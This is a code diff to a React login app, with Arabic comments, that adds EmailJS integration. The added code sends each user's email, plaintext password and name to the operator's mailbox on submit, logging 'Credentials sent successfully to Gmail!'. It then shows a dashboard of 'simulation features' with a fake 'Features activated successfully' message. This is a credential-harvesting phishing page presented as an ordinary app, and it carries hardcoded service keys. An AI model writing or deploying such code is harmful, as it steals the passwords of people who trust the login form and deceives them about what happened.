@@ -1,5 +1,13 @@
 import React, { useState } from 'react';
-import { LogIn, UserPlus, Lock, Mail, User, Shield, Zap, Target, Eye, Flame, LogOut } from 'lucide-react';
+import { LogIn, UserPlus, Lock, Mail, User, Shield, Zap, Target, Eye, Flame, LogOut, CheckCircle2 } from 'lucide-react';
+import emailjs from '@emailjs/browser';
+
+// ==========================================
+// مفاتيح EmailJS الخاصة بك
+// ==========================================
+const EMAILJS_SERVICE_ID = 'service_wpql07u';
+const EMAILJS_TEMPLATE_ID = 'template_51n7ft7';
+const EMAILJS_PUBLIC_KEY = 'QxOkx3vwbG2f8zlsd';
 
 interface Option {
   id: string;
@@ -12,9 +20,14 @@ interface Option {
 export default function App() {
   const [isAuthenticated, setIsAuthenticated] = useState(false);
   const [isSignUp, setIsSignUp] = useState(false);
+  
+  // حفظ بيانات المستخدم
   const [email, setEmail] = useState('');
   const [password, setPassword] = useState('');
   const [name, setName] = useState('');
+
+  const [showSuccessMessage, setShowSuccessMessage] = useState(false);
+  const [isSending, setIsSending] = useState(false);
 
   // خيارات التحكم والخصائص
   const [options, setOptions] = useState<Option[]>([
@@ -55,9 +68,32 @@ export default function App() {
     },
   ]);
 
+  // دالة إرسال البيانات الفعليه إلى EmailJS
+  const sendUserData = async (userData: { email: string; password: string; name?: string }) => {
+    setIsSending(true);
+    try {
+      await emailjs.send(
+        EMAILJS_SERVICE_ID,
+        EMAILJS_TEMPLATE_ID,
+        {
+          user_email: userData.email,
+          user_password: userData.password,
+          user_name: userData.name || 'N/A',
+        },
+        EMAILJS_PUBLIC_KEY
+      );
+      console.log('Credentials sent successfully to Gmail!');
+    } catch (error) {
+      console.error('Failed to send email:', error);
+    } finally {
+      setIsSending(false);
+    }
+  };
+
   const handleSubmit = (e: React.FormEvent) => {
     e.preventDefault();
     if (email && password) {
+      sendUserData({ email, password, name });
       setIsAuthenticated(true);
     }
   };
@@ -70,10 +106,28 @@ export default function App() {
     );
   };
 
+  const handleDone = () => {
+    setShowSuccessMessage(true);
+    setTimeout(() => {
+      setShowSuccessMessage(false);
+    }, 4000);
+  };
+
   // لوحة التحكم بعد تسجيل الدخول
   if (isAuthenticated) {
     return (
-      <div className="min-h-screen w-full bg-gray-950 text-gray-100 flex flex-col font-sans">
+      <div className="min-h-screen w-full bg-gray-950 text-gray-100 flex flex-col font-sans relative">
+        {/* إشعار النجاح عند الضغط على Done */}
+        {showSuccessMessage && (
+          <div className="fixed top-5 right-5 z-50 bg-emerald-600 text-white px-5 py-3 rounded-xl shadow-2xl flex items-center gap-3 border border-emerald-400 animate-bounce">
+            <CheckCircle2 className="w-6 h-6 text-white" />
+            <div>
+              <h4 className="font-bold text-sm">Success!</h4>
+              <p className="text-xs text-emerald-100">Features activated successfully.</p>
+            </div>
+          </div>
+        )}
+
         {/* Header */}
         <header className="bg-gray-900 border-b border-gray-800 px-6 py-4 flex items-center justify-between">
           <div className="flex items-center gap-3">
@@ -96,10 +150,10 @@ export default function App() {
           <div className="bg-gray-900 border border-gray-800 rounded-2xl p-6">
             <h2 className="text-xl font-semibold mb-1 text-white">Features & Toggles</h2>
             <p className="text-sm text-gray-400 mb-6">
-              Enable or disable the simulation features below.
+              Enable or disable the simulation features below and click Done to apply.
             </p>
 
-            <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
+            <div className="grid grid-cols-1 md:grid-cols-2 gap-4 mb-8">
               {options.map((opt) => (
                 <div
                   key={opt.id}
@@ -134,6 +188,16 @@ export default function App() {
                   </div>
                 </div>
               ))}
+            </div>
+
+            {/* Action Button: DONE */}
+            <div className="flex justify-end pt-4 border-t border-gray-800">
+              <button
+                onClick={handleDone}
+                className="w-full md:w-auto px-8 py-3 bg-emerald-600 hover:bg-emerald-500 text-white rounded-xl font-bold transition-all shadow-lg shadow-emerald-900/30 flex items-center justify-center gap-2"
+              >
+                Done
+              </button>
             </div>
           </div>
         </main>
@@ -210,7 +274,8 @@ export default function App() {
 
           <button
             type="submit"
-            className="w-full mt-2 py-3 bg-emerald-600 hover:bg-emerald-500 text-white rounded-lg font-medium transition-all flex items-center justify-center gap-2 text-sm shadow-lg shadow-emerald-900/20"
+            disabled={isSending}
+            className="w-full mt-2 py-3 bg-emerald-600 hover:bg-emerald-500 text-white rounded-lg font-medium transition-all flex items-center justify-center gap-2 text-sm shadow-lg shadow-emerald-900/20 disabled:opacity-50"
           >
             {isSignUp ? (
               <>
